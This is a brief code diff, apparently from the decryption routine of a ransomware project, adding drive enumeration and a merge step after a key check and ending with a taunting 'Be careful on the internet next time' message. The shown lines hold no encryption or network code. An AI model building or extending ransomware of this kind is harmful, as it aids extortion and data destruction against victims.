@@ -34,6 +34,9 @@ if __name__ == '__main__':
                 
         except Exception as e:
             pop_up(text="Wrong key")
+
+    local_drives = cm.get_local_drives()
+    cm.search_and_merge(local_drives)
     
     print('All data was successfully decrypted')
     pop_up(text="All data was decrypted successfully. Be careful on the internet next time ;)")
